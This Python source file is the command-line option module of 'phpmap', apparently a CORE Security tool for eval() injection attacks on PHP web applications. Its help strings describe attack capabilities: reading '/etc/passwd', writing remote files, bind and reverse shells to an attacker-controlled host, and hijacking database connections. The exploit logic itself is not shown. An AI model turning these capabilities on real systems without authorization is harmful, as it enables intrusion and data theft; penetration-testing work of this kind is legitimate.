#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
#
#
# Copyright (c) CORE Security, CORE SDI Inc.
# All rights reserved.
#
# This computer software is owned by Core SDI Inc. and is
# protected by U.S. copyright laws and other laws and by international
# treaties.  This computer software is furnished by CORE SDI Inc.
# pursuant to a written license agreement and may be used, copied,
# transmitted, and stored only in accordance with the terms of such
# license and with the inclusion of the above copyright notice.  This
# computer software or any other copies thereof may not be provided or
# otherwise made available to any other person.
#
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
#--

from optparse import OptionParser

class Options:
	def init(self):
		print """
-----------------------------------------------------------------
|      phpmap 0.3.0, eval() injection tool                      |
|      Level / CORE Security                                    |
-----------------------------------------------------------------

Here we go again..."""
		parser = OptionParser()
		#operation options
		parser.add_option("--url",dest="url",help="Target URL")#done
		parser.add_option("--forms",action="store_true",help="Discovers forms on target url")#done
		parser.add_option("--crawl",action="store_true",help="Builds a queue of forms to attack")#done
		parser.add_option("--restrict-domain",dest="restrict_domain",help="Allows restriction of the target domain")#done
		parser.add_option("--cookie",dest="cookieValue",help="Allows the use of an arbitrary cookie value")#done
		parser.add_option("--crawl-depth",dest="crawlDepth",help="Controls the crawler page depth")#review
		parser.add_option("--basic",dest="basicAuth",help="Enables basic authentication (ex 'user:pass')")#done
		#payload options
		parser.add_option("--fs-write",dest="fsWrite",help="Writes local file to the remote fs (ex: --fs-write='localFile.php:/var/www/html/remoteFile.php')")#done
		parser.add_option("--fs-read",dest="fsRead",help="Reads a file from the remote file system (ex: --fs-read='/etc/passwd')")#done
		parser.add_option("--os-shell",dest="osShell",help="Creates a non-interactive OS shell on the remote host")#done
		parser.add_option("--bind-shell",dest="bindShell",help="Bind to a port on the remote host with a OS shell (ex: --bind-shell='0.0.0.0:5555')")#done
		parser.add_option("--reverse-shell",dest="reverShell",help="Create a reverse OS shell to an attacker controlled host (ex: --reverse-shell='10.10.10.10:5555')")#done
		parser.add_option("--db-hook",dest="dbHook",help="Locate database connection strings in the www root, create malicious connection")#done
		parser.add_option("--fingerprint",action="store_true",help="Perform IG on the compromised remote host")
		parser.add_option("--clear-vuln-db",action="store_true",help="Deletes entries within the vuln database")#done
		(o, a) = parser.parse_args()
		return o, a